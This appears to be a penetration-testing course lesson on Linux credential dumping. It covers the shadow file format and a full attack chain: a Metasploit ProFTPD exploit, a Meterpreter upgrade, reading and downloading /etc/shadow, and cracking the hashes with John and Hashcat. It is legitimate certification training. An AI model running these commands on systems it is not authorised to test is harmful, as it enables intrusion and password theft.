# Linux Credential Dumping

This lesson covers how Linux stores passwords, how attackers extract them, and how captured hashes are used for offline cracking — all critical techniques for the eJPT.

> ⚠️ **Note**: All techniques require **root access** on the target Linux system. Unlike Windows, Linux password hashes **cannot be used directly for authentication** — they must be cracked offline to obtain plaintext passwords.

---

## How Linux Stores Passwords

Linux uses a **two-file system** to store user account information and password hashes separately, providing an important layer of security.

### The /etc/passwd File

The `/etc/passwd` file stores **basic account information** for every user on the system.

```bash
cat /etc/passwd
```

**Key facts**:
- Readable by **any user** on the system.
- Does **not** contain actual password hashes in modern Linux.
- Each line represents one user account in this format:

```
username:x:UID:GID:comment:home_dir:shell
```

The `x` in the password field means the actual hash is stored in `/etc/shadow`. If you see a hash directly here instead of `x`, the system is outdated and insecure.

### The /etc/shadow File

The `/etc/shadow` file stores the **actual password hashes** for all user accounts.

```bash
cat /etc/shadow
```

**Key facts**:
- Readable **only by root** — this is a critical security feature.
- Each line follows this format:

```
username:$id$salt$hash:last_changed:min:max:warn:inactive:expire
```

The hash field (`$id$salt$hash`) tells you everything you need:
- `$id` — identifies the **hashing algorithm** used.
- `$salt` — random value added before hashing (makes rainbow tables ineffective).
- `$hash` — the actual password hash.

### Linux Hashing Algorithms

The number after the first `$` in the shadow file identifies the algorithm:

| ID | Algorithm | Strength |
|----|-----------|---------|
| `$1` | MD5 | Weak — fast to crack |
| `$2` | Blowfish | Moderate |
| `$5` | SHA-256 | Strong |
| `$6` | SHA-512 | Very Strong — most common on modern Linux |

Example shadow entry:
```
root:$6$salt$hashedpassword:18000:0:99999:7:::
```
→ This user's password is hashed with **SHA-512** (`$6`).

> **Unlike Windows NTLM hashes**, Linux hashes include a **salt** — making Pass-the-Hash attacks impossible and rainbow tables ineffective. Cracking requires brute-force or dictionary attacks against each hash individually.

---

## Linux vs Windows Credential Dumping

| Feature | Linux | Windows |
|---------|-------|---------|
| **Hash storage** | `/etc/shadow` (root only) | SAM database (kernel-locked) |
| **Hash algorithm** | MD5, SHA-256, SHA-512 (salted) | LM / NTLM (no salt) |
| **Pass-the-Hash** | ❌ Not possible | ✅ Possible with NTLM |
| **Rainbow tables** | ❌ Salt prevents this | ✅ Effective against LM/NTLM |
| **Primary attack** | Offline cracking (Hashcat/John) | Pass-the-Hash / cracking |

---

## Dumping Linux Password Hashes

### Step 1: Gain Initial Access

Run an Nmap scan to identify exploitable services:

```bash
nmap -sV -sC <target_ip>
```

Example — target running **ProFTPD on port 21**:

```bash
# Search for exploits
searchsploit ProFTPD

# Launch Metasploit
msfconsole
msf6 > search ProFTPD
msf6 > use exploit/unix/ftp/proftpd_<version>_backdoor
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <your_ip>
msf6 > exploit
```

### Step 2: Upgrade to a Proper Shell

If you get a basic shell session, upgrade it:

```bash
# Spawn a proper interactive bash shell
/bin/bash -i
```

Then upgrade to a Meterpreter session for more capabilities:

```bash
# Background the current shell session
# In Metasploit:
msf6 > sessions -u <session_id>
```

`sessions -u` upgrades a basic shell to a full Meterpreter session automatically.

### Step 3: Verify Root Access

```bash
meterpreter > getuid
whoami   # Should return: root
id
```

You need root to access `/etc/shadow`.

### Step 4: Read the Shadow File Directly

With root access, read the shadow file:

```bash
meterpreter > shell
cat /etc/shadow
```

Example output:
```
root:$6$abc123$hashedpassword...:18000:0:99999:7:::
admin:$6$xyz789$anotherhash...:18000:0:99999:7:::
```

Download the files to Kali for offline cracking:

```bash
meterpreter > download /etc/shadow /root/shadow.txt
meterpreter > download /etc/passwd /root/passwd.txt
```

### Step 5: Use Metasploit's hashdump Module

Metasploit has a dedicated post-exploitation module that dumps Linux hashes in a format ready for cracking:

```bash
meterpreter > background
msf6 > use post/linux/gather/hashdump
msf6 > set SESSION <session_id>
msf6 > run
```

Output format: `username:$id$salt$hash`

---

## Cracking Linux Hashes

Unlike Windows, you **cannot use Linux hashes directly** for authentication — you must crack them to obtain the plaintext password.

### Method A: Unshadow + John the Ripper

First, combine `/etc/passwd` and `/etc/shadow` into a single crackable file:

```bash
# On Kali — combine the two files
unshadow /root/passwd.txt /root/shadow.txt > /root/unshadowed.txt

# Crack with John the Ripper using a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /root/unshadowed.txt

# View cracked passwords
john --show /root/unshadowed.txt
```

### Method B: Hashcat

Hashcat is faster for GPU-accelerated cracking:

```bash
# SHA-512 (mode 1800), SHA-256 (mode 7400), MD5 (mode 500)
hashcat -m 1800 /root/shadow.txt /usr/share/wordlists/rockyou.txt

# View cracked passwords
hashcat -m 1800 /root/shadow.txt --show
```

### Hashcat Mode Reference for Linux Hashes

| Hash ID | Algorithm | Hashcat Mode |
|---------|-----------|-------------|
| `$1` | MD5 | `500` |
| `$2` | Blowfish | `3200` |
| `$5` | SHA-256 | `7400` |
| `$6` | SHA-512 | `1800` |

---

## Complete Attack Chain

```
Nmap Scan → Exploit Service → Shell → Upgrade to Meterpreter → Root Access → Dump /etc/shadow → Crack Hashes
```

| Step | Action | Tool |
|------|--------|------|
| **1** | Scan for exploitable services | Nmap |
| **2** | Exploit service | Metasploit |
| **3** | Upgrade shell | `sessions -u <id>` |
| **4** | Verify root access | `getuid` / `whoami` |
| **5** | Dump hashes | `cat /etc/shadow` / `post/linux/gather/hashdump` |
| **6** | Download files | `download /etc/shadow` |
| **7** | Crack hashes offline | John the Ripper / Hashcat |

---

## Key Takeaways

- Linux uses **two files** for credential storage: `/etc/passwd` (public, account info) and `/etc/shadow` (root-only, password hashes).
- `/etc/passwd` is readable by all users but contains **no actual hashes** in modern Linux — just an `x` placeholder.
- `/etc/shadow` is readable **only by root** — this is the primary security control protecting password hashes.
- The hash format `$id$salt$hash` tells you the **algorithm** (`$6` = SHA-512), the **salt**, and the **hash**.
- Linux hashes include a **salt** — rainbow tables and Pass-the-Hash attacks are **not possible**. Offline cracking is the only option.
- Common algorithms: `$1` = MD5 (weak), `$5` = SHA-256, `$6` = SHA-512 (most common on modern systems).
- Use **`sessions -u <id>`** in Metasploit to upgrade a basic shell to a full Meterpreter session.
- Use **`post/linux/gather/hashdump`** to dump hashes in a format ready for cracking.
- **Download both `/etc/passwd` and `/etc/shadow`** — you need both for `unshadow` + John the Ripper.
- **`unshadow`** combines both files into a single crackable format for John the Ripper.
- **John the Ripper**: `john --wordlist=rockyou.txt unshadowed.txt` → `john --show` to display results.
- **Hashcat**: use mode `1800` for SHA-512 (`$6`), `7400` for SHA-256 (`$5`), `500` for MD5 (`$1`).
- Unlike Windows, cracked **plaintext passwords** are what you use for further access — not the hashes themselves.
